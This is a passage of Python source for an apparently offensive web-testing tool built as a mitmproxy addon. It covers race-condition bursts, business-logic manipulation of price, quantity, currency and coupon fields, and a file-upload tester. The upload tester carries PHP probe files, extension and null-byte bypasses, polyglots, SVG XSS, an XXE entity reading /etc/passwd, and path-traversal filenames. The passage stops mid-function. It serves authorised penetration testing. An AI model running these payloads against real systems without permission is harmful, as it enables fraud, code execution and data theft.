#!/usr/bin/env python3
"""
Durpie v2 - Advanced Attacks (Phase 5)
=======================================

Advanced security testing modules for complex vulnerability classes.

Phase 5 modules:
    - RaceConditionTester   : Parallel burst, last-byte sync, timing analysis,
                              anomaly detection on concurrent responses
    - BusinessLogicScanner  : Price/quantity manipulation, negative values,
                              workflow bypass, currency confusion, coupon stacking
    - FileUploadTester      : Extension bypass, MIME manipulation, magic bytes,
                              SVG XSS, XXE, path traversal, polyglots
    - DeserializationScanner: Java/PHP/Python/. NET detection, gadget chain hints

Usage as mitmproxy addons:
    mitmdump -s advanced_attacks.py

Standalone:
    import asyncio
    from advanced_attacks import RaceConditionTester
    async def main():
        tester = RaceConditionTester()
        results = await tester.burst("https://target.com/api/redeem", "POST",
                                     data={"coupon": "SAVE50"}, concurrency=20)
    asyncio.run(main())

WARNING: Only use against systems you own or have explicit written permission to test.
"""

import re
import io
import json
import time
import struct
import base64
import asyncio
import hashlib
import logging
import textwrap
import urllib.parse
from collections import Counter, defaultdict
from dataclasses import dataclass, field
from datetime import datetime
from typing import Dict, List, Optional, Tuple, Any

import aiohttp

logger = logging.getLogger(__name__)

try:
    from mitmproxy import http, ctx
    MITMPROXY_AVAILABLE = True
except ImportError:
    MITMPROXY_AVAILABLE = False

    class _DummyHTTP:
        class HTTPFlow:
            pass
    http = _DummyHTTP()
    ctx = None


# ============================================================
# SHARED
# ============================================================

@dataclass
class Finding:
    type: str
    severity: str
    url: str
    detail: str
    evidence: str = ""
    parameter: str = ""
    payload: str = ""
    poc: str = ""
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())

    def to_dict(self) -> Dict:
        return {k: v for k, v in self.__dict__.items()}

    def __str__(self) -> str:
        parts = [f"[{self.severity}] {self.type}"]
        if self.parameter:
            parts.append(f"param={self.parameter}")
        parts.append(f"url={self.url}")
        if self.detail:
            parts.append(self.detail)
        return " | ".join(parts)


@dataclass
class RaceResult:
    """Result of a single request in a race condition burst."""
    index: int
    status_code: int
    body: str
    elapsed: float
    error: str = ""

    @property
    def body_hash(self) -> str:
        return hashlib.md5(self.body.encode()).hexdigest()[:8]


def _mlog(prefix: str, msg: str, level: str = "info"):
    if MITMPROXY_AVAILABLE and ctx:
        getattr(ctx.log, level)(f"[{prefix}] {msg}")
    else:
        getattr(logger, "warning" if level == "warn" else level)(f"[{prefix}] {msg}")


# ============================================================
# RACE CONDITION TESTER
# ============================================================

class RaceConditionTester:
    """
    Race Condition Testing Framework.

    What is a race condition?
        When a server performs a check-then-act sequence without atomic locking,
        two concurrent requests can both pass the check before either completes
        the act. Classic examples:
        - Redeem a coupon: check(not_used) → mark_used → apply_discount
          Two simultaneous requests both pass check() before either mark_used runs.
        - Transfer funds: check(balance >= amount) → deduct → credit
          Two concurrent debits both pass the balance check.
        - Vote / like: check(not_voted) → increment → record_voter

    Techniques implemented:
        1. Parallel burst     - asyncio.gather() sends N requests simultaneously.
                                Effective when the race window is large (>10ms).
        2. Last-byte sync     - Send request headers early, buffer the final byte,
                                then flush all final bytes at once. Shrinks the
                                arrival window to sub-millisecond, matching
                                Turbo Intruder's "single-packet attack" concept.
        3. Timing analysis    - Compare response times across the burst. Outliers
                                may indicate a thread was delayed waiting on a lock
                                (meaning the race IS being contested server-side).
        4. Response anomaly   - Count unique response bodies/status codes.
                                In a correctly-serialised endpoint all N responses
                                are identical. Variation = race condition won.

    Usage:
        tester = RaceConditionTester()
        results = await tester.burst(url, "POST", data={"coupon": "SAVE10"},
                                     concurrency=20)
        analysis = tester.analyse(results, url)
    """

    # Keywords that flag a request as a race candidate
    RACE_KEYWORDS = [
        "transfer", "withdraw", "deposit", "payment", "pay", "charge",
        "vote", "like", "upvote", "downvote", "react",
        "follow", "subscribe", "enroll", "register",
        "coupon", "discount", "promo", "redeem", "voucher", "code",
        "quantity", "stock", "inventory", "reserve", "book", "slot",
        "gift", "reward", "points", "credits", "balance",
        "limit", "quota", "rate",
    ]

    def __init__(self):
        self.findings: List[Finding] = []
        self._candidates: List[Dict] = []

    def _log(self, msg): _mlog("Race", msg)
    def _warn(self, msg): _mlog("Race", msg, "warn")

    def _add(self, f: Finding):
        self.findings.append(f)
        self._warn(str(f))

    def is_candidate(self, url: str, method: str, body) -> bool:
        """Check if a request is a good race condition candidate."""
        body_str = body.decode(errors="replace") if isinstance(body, bytes) else (body or "")
        combined = (url + body_str).lower()
        return (method in ("POST", "PUT", "PATCH") and
                any(kw in combined for kw in self.RACE_KEYWORDS))

    # ------------------------------------------------------------------
    # Burst (parallel asyncio)
    # ------------------------------------------------------------------

    async def burst(self, url: str, method: str = "POST",
                    headers: Dict = None, data: Dict = None,
                    json_data: Dict = None, concurrency: int = 20,
                    timeout: int = 15) -> List[RaceResult]:
        """
        Send `concurrency` identical requests as simultaneously as possible.

        Uses asyncio.gather() which schedules all coroutines before yielding
        to the event loop, giving the tightest possible arrival window from
        a single thread.
        """
        self._log(f"Burst x{concurrency}: {method} {url}")

        async def _one(i: int) -> RaceResult:
            try:
                conn = aiohttp.TCPConnector(ssl=False)
                async with aiohttp.ClientSession(connector=conn) as s:
                    start = time.monotonic()
                    async with s.request(
                        method, url,
                        headers=headers or {},
                        data=data,
                        json=json_data,
                        timeout=aiohttp.ClientTimeout(total=timeout),
                        allow_redirects=False,
                    ) as r:
                        body = await r.text(errors="replace")
                        elapsed = time.monotonic() - start
                        return RaceResult(i, r.status, body, elapsed)
            except Exception as e:
                return RaceResult(i, 0, "", 0.0, error=str(e))

        results = await asyncio.gather(*[_one(i) for i in range(concurrency)])
        return list(results)

    # ------------------------------------------------------------------
    # Last-byte sync (Turbo-Intruder style)
    # ------------------------------------------------------------------

    async def last_byte_sync(self, url: str, method: str = "POST",
                             headers: Dict = None, body: bytes = b"",
                             concurrency: int = 20,
                             timeout: int = 15) -> List[RaceResult]:
        """
        Last-byte synchronisation attack.

        How it works:
        1. Open `concurrency` TCP connections to the target.
        2. Send the complete request EXCEPT the final byte of the body on all
           connections (the server buffers these — it won't start processing
           until the request is complete).
        3. Flush the final byte on all connections as close together as possible.
        4. The server receives all complete requests within microseconds of each
           other, creating the smallest possible race window.

        This is the technique used by Burp Suite's Turbo Intruder for single-
        packet HTTP/1.1 race attacks and is particularly effective against
        endpoints with narrow race windows.
        """
        parsed = urllib.parse.urlparse(url)
        host = parsed.hostname
        port = parsed.port or (443 if parsed.scheme == "https" else 80)
        path = parsed.path or "/"
        if parsed.query:
            path += "?" + parsed.query
        use_tls = parsed.scheme == "https"

        hdrs = {
            "Host": host,
            "Content-Type": "application/x-www-form-urlencoded",
            "Content-Length": str(len(body) + 1),  # +1 for the held-back byte
            "Connection": "close",
            **(headers or {}),
        }
        header_str = "\r\n".join(
            f"{k}: {v}" for k, v in hdrs.items()
        )
        # Request up to (but not including) the last byte
        request_head = (
            f"{method} {path} HTTP/1.1\r\n"
            f"{header_str}\r\n\r\n"
        ).encode()
        body_without_last = body[:-1] if body else b""
        last_byte = body[-1:] if body else b"X"

        results: List[RaceResult] = []

        async def _connect_and_prime():
            """Open connection and send everything except the last byte."""
            if use_tls:
                import ssl as _ssl
                ctx_ssl = _ssl.create_default_context()
                ctx_ssl.check_hostname = False
                ctx_ssl.verify_mode = _ssl.CERT_NONE
                r, w = await asyncio.open_connection(host, port, ssl=ctx_ssl)
            else:
                r, w = await asyncio.open_connection(host, port)
            w.write(request_head + body_without_last)
            await w.drain()
            return r, w

        async def _fire_and_read(r, w, i: int) -> RaceResult:
            """Send the last byte and read the response."""
            start = time.monotonic()
            try:
                w.write(last_byte)
                await w.drain()
                response_bytes = await asyncio.wait_for(r.read(16384), timeout=timeout)
                elapsed = time.monotonic() - start
                response_text = response_bytes.decode("utf-8", errors="replace")
                # Parse HTTP status line
                status = 0
                if response_text.startswith("HTTP/"):
                    try:
                        status = int(response_text.split(" ")[1])
                    except (IndexError, ValueError):
                        pass
                # Body is everything after the blank line
                body_start = response_text.find("\r\n\r\n")
                body_text = response_text[body_start + 4:] if body_start >= 0 else response_text
                return RaceResult(i, status, body_text, elapsed)
            except Exception as e:
                return RaceResult(i, 0, "", 0.0, error=str(e))
            finally:
                w.close()

        # Phase 1: open all connections and prime them simultaneously
        self._log(f"Last-byte sync x{concurrency}: {method} {url}")
        try:
            conn_tasks = [_connect_and_prime() for _ in range(concurrency)]
            connections = await asyncio.gather(*conn_tasks, return_exceptions=True)

            valid = [(r, w, i) for i, conn in enumerate(connections)
                     if not isinstance(conn, Exception)
                     for r, w in [conn]]

            if not valid:
                self._log("All connections failed — host unreachable")
                return []

            # Phase 2: fire all last bytes simultaneously
            fire_tasks = [_fire_and_read(r, w, i) for r, w, i in valid]
            results = await asyncio.gather(*fire_tasks, return_exceptions=True)
            return [r for r in results if isinstance(r, RaceResult)]

        except Exception as e:
            self._log(f"Last-byte sync error: {e}")
            return []

    # ------------------------------------------------------------------
    # Response analysis
    # ------------------------------------------------------------------

    def analyse(self, results: List[RaceResult], url: str) -> Optional[Finding]:
        """
        Analyse burst results for race condition indicators.

        Indicators:
            - Multiple unique response bodies (not all requests got the same result)
            - Mix of success/failure status codes (some won, some lost the race)
            - Outlier response times (some requests were delayed by a lock)
            - Duplicate successful actions (e.g. coupon applied twice)
        """
        ok = [r for r in results if r.status_code != 0 and not r.error]
        if not ok:
            return None

        status_counts = Counter(r.status_code for r in ok)
        body_counts = Counter(r.body_hash for r in ok)
        times = [r.elapsed for r in ok]

        unique_bodies = len(body_counts)
        unique_statuses = len(status_counts)
        n = len(ok)

        # Timing analysis: stddev of response times
        if times:
            mean_t = sum(times) / len(times)
            variance = sum((t - mean_t) ** 2 for t in times) / len(times)
            stddev_t = variance ** 0.5
        else:
            mean_t = stddev_t = 0.0

        race_indicators = []
        severity = "INFO"

        if unique_bodies > 1:
            race_indicators.append(
                f"{unique_bodies} unique response bodies out of {n} requests "
                f"(distribution: {dict(body_counts)})"
            )
            severity = "HIGH"

        if unique_statuses > 1:
            race_indicators.append(
                f"Mixed status codes: {dict(status_counts)}"
            )
            severity = "HIGH"

        # High timing variance may indicate lock contention (race IS being contested)
        if stddev_t > mean_t * 0.5 and mean_t > 0:
            race_indicators.append(
                f"High response time variance: mean={mean_t:.3f}s, "
                f"stddev={stddev_t:.3f}s — possible lock contention"
            )
            severity = max(severity, "MEDIUM",
                          key=lambda s: ["INFO","LOW","MEDIUM","HIGH","CRITICAL"].index(s))

        if not race_indicators:
            self._log(f"No race condition indicators for {url}")
            return None

        f = Finding(
            type="Race Condition Detected",
            severity=severity,
            url=url,
            detail=(
                f"Race condition indicators found in {n}-request burst: "
                + " | ".join(race_indicators)
            ),
            evidence=json.dumps({
                "concurrency": n,
                "unique_bodies": unique_bodies,
                "status_codes": dict(status_counts),
                "mean_elapsed": round(mean_t, 3),
                "stddev_elapsed": round(stddev_t, 3),
            }),
            poc=(
                f"# Race condition test (requires valid session):\n"
                f"python3 -c \"\n"
                f"import asyncio, aiohttp\n"
                f"async def race():\n"
                f"    tasks = [aiohttp.ClientSession().post('{url}') for _ in range(20)]\n"
                f"    return await asyncio.gather(*tasks)\n"
                f"asyncio.run(race())\n"
                f"\"\n\n"
                f"# Or with Turbo Intruder (Burp Suite extension):\n"
                f"# Use the 'race-single-packet-attack.py' template"
            ),
        )
        self._add(f)
        return f

    # ---- mitmproxy addon hooks ----

    def request(self, flow: "http.HTTPFlow"):
        """Flag race condition candidates from passing traffic."""
        url = flow.request.pretty_url
        method = flow.request.method
        body = flow.request.get_text()

        if self.is_candidate(url, method, body):
            matched = [kw for kw in self.RACE_KEYWORDS if kw in (url + body).lower()]
            self._candidates.append({
                "url": url,
                "method": method,
                "headers": dict(flow.request.headers),
                "body": body,
                "keywords": matched,
            })
            self._add(Finding(
                type="Race Condition Candidate",
                severity="INFO",
                url=url,
                detail=(
                    f"Request matches race-sensitive keywords: {matched}. "
                    "Queue for concurrent burst testing."
                ),
                poc=(
                    f"# Burst test:\n"
                    f"from advanced_attacks import RaceConditionTester\n"
                    f"import asyncio, json\n"
                    f"async def test():\n"
                    f"    t = RaceConditionTester()\n"
                    f"    results = await t.burst('{url}', '{method}', concurrency=20)\n"
                    f"    t.analyse(results, '{url}')\n"
                    f"asyncio.run(test())"
                ),
            ))


# ============================================================
# BUSINESS LOGIC SCANNER
# ============================================================

class BusinessLogicScanner:
    """
    Business Logic Vulnerability Scanner.

    Business logic flaws exploit the intended functionality of an application
    rather than its technical implementation. They're hard to find with
    automated tools because they require understanding business rules.

    Tests:
        1. Price manipulation    - Submit prices the app didn't quote (negative,
                                   zero, far below/above market). Many shopping
                                   carts trust the client-submitted price.
        2. Quantity manipulation - Negative quantities, zero, integer overflow.
                                   Negative quantity × positive price = credit.
        3. Workflow bypass       - Skip mandatory steps (checkout → payment → confirm)
                                   by going directly to the final endpoint.
        4. Negative value abuse  - Negative coupon codes, negative transfer amounts
                                   (transfer -£100 from victim to attacker).
        5. Currency confusion    - Submit price in a weaker currency, receive
                                   goods priced as the stronger currency.
        6. Coupon stacking       - Apply multiple promotions simultaneously by
                                   replaying coupon endpoints or using API directly.
        7. Mass purchase limit bypass - Purchase more than allowed via parallel
                                       requests (race condition variant).
    """

    # Field names that suggest price/monetary values
    PRICE_FIELDS = [
        "price", "amount", "cost", "fee", "total", "subtotal",
        "unit_price", "sale_price", "discount", "tip", "charge",
        "value", "rate", "fare",
    ]

    # Field names that suggest quantities
    QUANTITY_FIELDS = [
        "quantity", "qty", "count", "num", "number", "amount",
        "units", "items", "copies",
    ]

    # Numeric test values that often expose logic flaws
    NUMERIC_ATTACKS = [
        0,              # Zero — some systems treat as free
        -1,             # Negative one
        -100,           # Large negative
        0.01,           # Sub-cent
        -0.01,          # Negative sub-cent
        99999999,       # Very large (integer overflow?)
        2147483647,     # INT_MAX (32-bit)
        2147483648,     # INT_MAX + 1 (overflow to negative)
        -2147483648,    # INT_MIN
        1e308,          # Float max
    ]

    # Common currency codes for confusion testing
    CURRENCIES = ["USD", "EUR", "GBP", "JPY", "INR", "VND", "IDR", "PKR"]

    def __init__(self):
        self.findings: List[Finding] = []
        self._workflow_steps: Dict[str, List[str]] = defaultdict(list)
        self._coupon_endpoints: List[str] = []
        self._payment_endpoints: List[str] = []

    def _log(self, msg): _mlog("BizLogic", msg)
    def _warn(self, msg): _mlog("BizLogic", msg, "warn")

    def _add(self, f: Finding):
        self.findings.append(f)
        self._warn(str(f))

    def _find_numeric_fields(self, body: Any, prefix: str = "") -> List[Tuple[str, Any]]:
        """Recursively find numeric fields in a JSON structure."""
        found = []
        if isinstance(body, dict):
            for k, v in body.items():
                path = f"{prefix}.{k}" if prefix else k
                if isinstance(v, (int, float)) and not isinstance(v, bool):
                    found.append((path, v))
                elif isinstance(v, str):
                    try:
                        float(v)  # numeric string
                        found.append((path, v))
                    except ValueError:
                        pass
                elif isinstance(v, (dict, list)):
                    found.extend(self._find_numeric_fields(v, path))
        elif isinstance(body, list):
            for i, item in enumerate(body):
                found.extend(self._find_numeric_fields(item, f"{prefix}[{i}]"))
        return found

    def _field_matches(self, name: str, keyword_list: List[str]) -> bool:
        name_l = name.lower().replace("_", "").replace("-", "")
        return any(kw.replace("_", "") in name_l for kw in keyword_list)

    def analyse_request(self, url: str, method: str,
                        body: Any, headers: Dict) -> List[Finding]:
        """
        Passively analyse a request for business logic manipulation opportunities.
        Returns advisory findings describing what to test manually.
        """
        findings = []
        if not isinstance(body, dict):
            return findings

        # ---- Price manipulation fields ----
        for field_path, value in self._find_numeric_fields(body):
            field_name = field_path.split(".")[-1]

            if self._field_matches(field_name, self.PRICE_FIELDS):
                try:
                    original = float(value)
                except (ValueError, TypeError):
                    continue

                attack_values = [
                    v for v in self.NUMERIC_ATTACKS
                    if v != original
                ][:5]

                findings.append(Finding(
                    type="Price Manipulation Test Required",
                    severity="MEDIUM",
                    url=url,
                    detail=(
                        f"Field '{field_path}' looks like a price (current value: {value}). "
                        f"Test with: {attack_values}. "
                        "If the server trusts the client-submitted price, this enables "
                        "purchasing goods for free or at negative cost."
                    ),
                    parameter=field_path,
                    payload=json.dumps({field_name: -1}),
                    poc=(
                        f"# Price manipulation tests for '{field_path}':\n"
                        + "\n".join(
                            f"  Set {field_path} = {v}" for v in attack_values
                        )
                    ),
                ))

            # ---- Quantity manipulation fields ----
            if self._field_matches(field_name, self.QUANTITY_FIELDS):
                findings.append(Finding(
                    type="Quantity Manipulation Test Required",
                    severity="MEDIUM",
                    url=url,
                    detail=(
                        f"Field '{field_path}' looks like a quantity (current: {value}). "
                        "Test with: -1, 0, 99999999, -2147483648 (INT_MIN). "
                        "Negative quantity × positive price = credit in some systems."
                    ),
                    parameter=field_path,
                    payload=json.dumps({field_name: -1}),
                    poc=(
                        f"# Quantity manipulation:\n"
                        f"  {field_path} = -1    → negative purchase (may credit account)\n"
                        f"  {field_path} = 0     → free item\n"
                        f"  {field_path} = 99999 → exceed stock limit\n"
                        f"  {field_path} = 2147483648 → 32-bit overflow to negative"
                    ),
                ))

        # ---- Currency field ----
        currency_fields = [k for k in body if "currency" in k.lower() or k.lower() == "cur"]
        if currency_fields:
            current_currency = body.get(currency_fields[0], "USD")
            cheaper = [c for c in self.CURRENCIES if c != current_currency][:3]
            findings.append(Finding(
                type="Currency Confusion Test Required",
                severity="MEDIUM",
                url=url,
                detail=(
                    f"Field '{currency_fields[0]}' contains currency code '{current_currency}'. "
                    f"Try submitting weaker currencies ({cheaper}) while the server charges "
                    "in the original — this is currency confusion."
                ),
                parameter=currency_fields[0],
                poc=(
                    f"# Currency confusion:\n"
                    f"  Original: {current_currency}\n"
                    f"  Try: {cheaper}\n"
                    f"  If a $100 item accepts currency=VND, the charge may be 100 VND ≈ $0.004"
                ),
            ))

        # ---- Coupon/promo code fields ----
        coupon_fields = [k for k in body
                         if any(kw in k.lower() for kw in
                                ["coupon", "promo", "code", "voucher", "discount"])]
        if coupon_fields and method in ("POST", "PUT"):
            self._coupon_endpoints.append(url)
            findings.append(Finding(
                type="Coupon Stacking Test Required",
                severity="LOW",
                url=url,
                detail=(
                    f"Coupon/promo field detected: {coupon_fields}. "
                    "Test coupon stacking: apply the same coupon multiple times, "
                    "apply multiple different codes, or apply after partial payment."
                ),
                poc=(
                    "# Coupon stacking tests:\n"
                    "# 1. Apply valid coupon, then replay the same request\n"
                    "# 2. Intercept and change coupon code after first application\n"
                    "# 3. Apply coupon via API while also using store UI discount\n"
                    "# 4. Race condition: apply same coupon 20x concurrently"
                ),
            ))

        for f in findings:
            self._add(f)
        return findings

    def track_workflow(self, url: str, session_id: str):
        """Track request order to detect workflow bypass opportunities."""
        self._workflow_steps[session_id].append(url)

        steps = self._workflow_steps[session_id]

        # Detect if a "final" step appears without the intermediate steps
        final_indicators = ["confirm", "complete", "checkout", "pay", "submit",
                            "finish", "place", "purchase"]
        setup_indicators = ["cart", "basket", "review", "shipping", "billing",
                            "address", "payment-method"]

        url_l = url.lower()
        if any(ind in url_l for ind in final_indicators):
            has_setup = any(
                any(ind in s.lower() for ind in setup_indicators)
                for s in steps[:-1]  # all steps before this one
            )
            if not has_setup and len(steps) > 1:
                self._add(Finding(
                    type="Workflow Step-Skip Detected",
                    severity="HIGH",
                    url=url,
                    detail=(
                        "Final checkout/confirmation step reached without passing "
                        "through expected intermediate steps (cart → shipping → payment). "
                        "The server may not enforce the correct workflow server-side."
                    ),
                    evidence=f"Steps: {steps}",
                    poc=(
                        "# Workflow bypass test:\n"
                        "# After logging in, navigate DIRECTLY to the final step:\n"
                        f"#   {url}\n"
                        "# Without visiting cart/shipping/payment steps first.\n"
                        "# If the server accepts the order, workflow is not enforced."
                    ),
                ))

    # ---- mitmproxy addon hooks ----

    def request(self, flow: "http.HTTPFlow"):
        url = flow.request.pretty_url
        method = flow.request.method
        body_text = flow.request.get_text()

        try:
            body = json.loads(body_text) if body_text else {}
        except json.JSONDecodeError:
            body = {}

        headers = dict(flow.request.headers)

        # Session tracking for workflow analysis
        session_id = (
            flow.request.cookies.get("session", "") or
            flow.request.cookies.get("PHPSESSID", "") or
            flow.request.headers.get("Authorization", "")[:32]
        )
        if session_id:
            self.track_workflow(url, session_id)

        self.analyse_request(url, method, body, headers)


# ============================================================
# FILE UPLOAD TESTER
# ============================================================

class FileUploadTester:
    """
    File Upload Vulnerability Tester.

    File upload endpoints are a frequent source of critical vulnerabilities
    because they combine user-supplied filenames, content types, and content
    with complex server-side processing (image resizing, virus scanning,
    format parsing) that attackers can target.

    Tests:
        1. Extension bypass     - Upload PHP/JSP/ASP with misleading extensions:
                                  .php.jpg, .php5, .phtml, .php%00.jpg (null byte
                                  truncation in PHP < 5.3.4), .PHP (case bypass).
        2. Content-Type bypass  - Upload executable file with image/jpeg MIME type.
                                  Servers that trust Content-Type without validating
                                  file content will store the executable.
        3. Magic byte injection - Prepend GIF89a (GIF magic bytes) to PHP code.
                                  File signature checkers pass; server executes PHP.
        4. SVG XSS              - SVG files execute embedded JavaScript in browsers.
                                  An image upload accepting SVGs enables stored XSS.
        5. XXE via XML upload   - SVG, DOCX, XLSX contain XML parsers vulnerable to
                                  XXE if the server parses them server-side.
        6. Path traversal       - Filename = ../../etc/passwd or ../webroot/shell.php
                                  to write files outside the upload directory.
        7. Polyglot files       - Files valid as both an image and as code
                                  (JPEG+PHP, PDF+JS). Passes image validation
                                  but executes as code when served.

    Detection strategy:
        The scanner generates attack payloads and tests them against detected
        upload endpoints. Success is measured by:
        - HTTP 200 response (file stored)
        - File accessible at a predictable URL
        - Execution indicators (PHP error, template engine response)
    """

    # PHP/server-side extension bypasses (ordered by likelihood of success)
    PHP_EXTENSIONS = [
        ".php", ".php3", ".php4", ".php5", ".php7", ".phtml", ".phar",
        ".PHP", ".Php", ".pHp",                           # case variation
        ".php.jpg", ".php.png", ".php.gif",               # double extension
        ".php%00.jpg", ".php\x00.jpg",                    # null byte truncation
        ".php%20",                                         # trailing space
        ".php.",                                           # trailing dot (Windows)
        ".php::$DATA",                                     # NTFS alternate data stream
    ]

    # Other server-side script extensions
    OTHER_EXTENSIONS = [
        ".asp", ".aspx", ".asa", ".ashx", ".asmx",        # ASP.NET
        ".jsp", ".jspx", ".jsw", ".jsv",                   # Java
        ".cfm", ".cfml",                                   # ColdFusion
        ".cgi", ".pl",                                     # Perl CGI
        ".py",                                             # Python WSGI
        ".rb",                                             # Ruby on Rails
        ".shtml",                                          # SSI
    ]

    # Simple PHP webshell payload (minimal — for detection purposes only)
    PHP_PROBE = b"<?php echo 'DURPIE_UPLOAD_' . phpversion(); ?>"

    # GIF magic bytes — prepend to make file appear as GIF to magic-byte checkers
    GIF_MAGIC = b"GIF89a"
    JPEG_MAGIC = b"\xff\xd8\xff\xe0\x00\x10JFIF"
    PNG_MAGIC = b"\x89PNG\r\n\x1a\n"

    # SVG with embedded XSS
    SVG_XSS = b"""<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <script type="text/javascript">alert('DURPIE_SVG_XSS')</script>
  <image href="x" onerror="alert('DURPIE_SVG_XSS_IMG')"/>
</svg>"""

    # XXE via SVG
    SVG_XXE = b"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>"""

    # Polyglot: valid GIF header + PHP execution
    POLYGLOT_GIF_PHP = GIF_MAGIC + b"\x01\x00\x01\x00" + PHP_PROBE

    def __init__(self):
        self.findings: List[Finding] = []
        self._upload_endpoints: List[str] = []

    def _log(self, msg): _mlog("FileUpload", msg)
    def _warn(self, msg): _mlog("FileUpload", msg, "warn")

    def _add(self, f: Finding):
        self.findings.append(f)
        self._warn(str(f))

    def generate_payloads(self) -> List[Dict]:
        """
        Generate all file upload attack payloads.

        Returns a list of payload dictionaries, each containing:
        - name: Attack name
        - filename: The filename to use in the multipart upload
        - content: File content bytes
        - content_type: MIME type to send
        - severity: Finding severity if successful
        - detail: What this attack tests
        """
        payloads = []

        # 1. PHP extension bypasses
        for ext in self.PHP_EXTENSIONS:
            payloads.append({
                "name": f"PHP Extension Bypass ({ext})",
                "filename": f"durpie_probe{ext}",
                "content": self.PHP_PROBE,
                "content_type": "image/jpeg",
                "severity": "CRITICAL",
                "detail": (
                    f"Upload PHP code with extension '{ext}'. "
                    "If accessible via HTTP and the server executes it, "
                    "this is Remote Code Execution."
                ),
                "category": "extension_bypass",
            })

        # 2. MIME type bypass (real PHP, wrong Content-Type)
        payloads.append({
            "name": "MIME Type Bypass (PHP as image/jpeg)",
            "filename": "shell.php",
            "content": self.PHP_PROBE,
            "content_type": "image/jpeg",
            "severity": "CRITICAL",
            "detail": (
                "Upload PHP file with Content-Type: image/jpeg. "
                "Servers that validate only MIME type (not file content) will store it."
            ),
            "category": "mime_bypass",
        })

        # 3. Magic byte injection (GIF + PHP)
        payloads.append({
            "name": "Magic Byte Injection (GIF+PHP polyglot)",
            "filename": "durpie_polyglot.gif",
            "content": self.POLYGLOT_GIF_PHP,
            "content_type": "image/gif",
            "severity": "CRITICAL",
            "detail": (
                "File starts with GIF89a magic bytes (passes signature check) "
                "but contains PHP code. If stored with .php extension or accessed "
                "via a PHP inclusion, this executes server-side."
            ),
            "category": "magic_bytes",
        })

        # 4. SVG XSS
        payloads.append({
            "name": "SVG XSS",
            "filename": "durpie_xss.svg",
            "content": self.SVG_XSS,
            "content_type": "image/svg+xml",
            "severity": "HIGH",
            "detail": (
                "SVG file with embedded JavaScript. If served with Content-Type: image/svg+xml "
                "or inline in HTML, the script executes in the victim's browser (Stored XSS)."
            ),
            "category": "svg_xss",
        })

        # 5. XXE via SVG
        payloads.append({
            "name": "XXE via SVG Upload",
            "filename": "durpie_xxe.svg",
            "content": self.SVG_XXE,
            "content_type": "image/svg+xml",
            "severity": "HIGH",
            "detail": (
                "SVG with XML External Entity (XXE) declaration. If the server parses "
                "the SVG XML, it may read /etc/passwd or perform SSRF via the XXE entity."
            ),
            "category": "xxe",
        })

        # 6. Path traversal filenames
        traversal_names = [
            "../durpie_traversal.php",
            "../../var/www/html/durpie.php",
            "..\\..\\webroot\\durpie.php",
            "%2e%2e%2fdurpie.php",
            "....//durpie.php",
        ]
        for tname in traversal_names:
            payloads.append({
                "name": f"Path Traversal Filename ({tname})",
                "filename": tname,
                "content": self.PHP_PROBE,
                "content_type": "image/jpeg",
                "severity": "CRITICAL",
                "detail": (
                    f"Filename contains path traversal sequence: {tname!r}. "
                    "If the server uses the client-supplied filename, the file may be "
                    "written outside the upload directory (webroot, config dirs, etc.)."
                ),
                "category": "path_traversal",
            })

        # 7. Other server-side extensions
        for ext in self.OTHER_EXTENSIONS[:4]:
            payloads.append({
                "name": f"Server-Side Script Upload ({ext})",
                "filename": f"durpie_probe{ext}",
                "content": b"<!-- durpie probe -->",
                "content_type": "image/jpeg",
                "severity": "HIGH",
                "detail": (
                    f"Upload file with '{ext}' extension. "
                    "If accessible and the server executes this extension, "
                    "this may enable code execution or information disclosure."
                ),
                "category": "extension_bypass",
            })

        return payloads

    def build_multipart(self, field_name: str, filename: str,
                        content: bytes, content_type: str,
                        extra_fields: Dict = None) -> Tuple[bytes, str]:
        """
        Build a multipart/form-data request body.

        Returns (body_bytes, boundary_string).
        """
        boundary = f"DurpieUploadBoundary{hashlib.md5(filename.encode()).hexdigest()[:8]}"
        body = io.BytesIO()

        # Extra form fields (if any)
        for fname, fvalue in (extra_fields or {}).items():
            body.write(f"--{boundary}\r\n".encode())
            body.write(f'Content-Disposition: form-data; name="{fname}"\r\n\r\n'.encode())
            body.write(f"{fvalue}\r\n".encode())

        # File field
        body.write(f"--{boundary}\r\n".encode())
        body.write(
            f'Content-Disposition: form-data; name="{field_name}"; '
            f'filename="{filename}"\r\n'.encode()
        )
        body.write(f"Content-Type: {content_type}\r\n\r\n".encode())
        body.write(content)
        body.write(f"\r\n--{boundary}--\r\n".encode())

        return body.getvalue(), boundary

    async def test_endpoint(self, url: str, upload_field: str = "file",
                            extra_fields: Dict = None,
                            headers: Dict = None) -> List[Finding]:
        """
        Test a file upload endpoint with all generated attack payloads.

        Args:
            url: Upload endpoint URL.
            upload_field: Multipart form field name for the file.
            extra_fields: Additional form fields (e.g. CSRF token).
            headers: Request headers.
        """
        findings = []
        payloads = self.generate_payloads()
        self._log(f"Testing {len(payloads)} upload payloads against {url}")

        req_headers = dict(headers or {})

        seen_categories: set = set()

        for payload in payloads:
            category = payload["category"]

            # Only test one per category for rate limiting (probe, then report)
            if category in seen_categories and category != "extension_bypass":
                continue

            body_bytes, boundary = self.build_multipart(
                upload_field,
                payload["filename"],
                payload["content"],
                payload["content_type"],
                extra_fields,
            )

            upload_headers = {
                **req_headers,
                "Content-Type": f"multipart/form-data; boundary={boundary}",
            }

            try:
                conn = aiohttp.TCPConnector(ssl=False)
                async with aiohttp.ClientSession(connector=conn) as s:
                    async with s.post(
                        url,
                        headers=upload_headers,
                        data=body_bytes,
                        timeout=aiohttp.ClientTimeout(total=15),
                        allow_redirects=False,
                    ) as resp:
                        status = resp.status
                        resp_body = await resp.text(errors="replace")
            except Exception as e:
                self._log(f"Upload error for {payload['filename']}: {e}")
                continue

            # Success indicators: 200/201 response AND file appears accepted
            accepted = status in (200, 201, 202) and not any(
                kw in resp_body.lower()
                for kw in ["error", "invalid", "not allowed", "forbidden",
                           "rejected", "only", "must be"]
            )

            if accepted:
                seen_categories.add(category)
                f = Finding(
                    type=f"File Upload Vulnerability - {payload['name']}",
                    severity=payload["severity"],
                    url=url,
                    detail=payload["detail"],
                    evidence=f"HTTP {status} — file appears accepted",
                    parameter=upload_field,
                    payload=payload["filename"],
                    poc=(
                        f"# Verify execution (find upload URL first):\n"
